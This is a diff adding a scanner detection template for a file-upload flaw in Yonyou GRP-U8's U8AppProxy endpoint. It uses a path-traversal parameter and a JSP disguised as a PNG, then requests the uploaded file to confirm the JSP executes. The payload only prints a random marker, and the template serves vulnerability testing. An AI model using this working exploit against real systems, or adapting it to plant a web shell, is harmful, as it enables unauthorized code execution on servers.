@@ -1,0 +1,26 @@
+name: yongyou-grp-u8-app-proxy-uploadfile
+set:
+  randstr: randomLowercase(5)
+  randbody: randomLowercase(28)
+  rboundary: randomLowercase(8)
+rules:
+  - method: POST
+    path: "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{randstr}}"
+    headers:
+      Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+    body: "\
+      --WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\"1.jsp\"\r\n\
+      Content-Type: image/png\r\n\
+      \r\n\
+      <% out.println(\"{{randbody}}\");%>\r\n\
+      --WebKitFormBoundary{{rboundary}}-\r\n\
+      "
+    expression: |
+      response.status == 500
+  - method: GET
+    path: "/{{randstr}}.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(randbody))
+detail:
+  author: 666
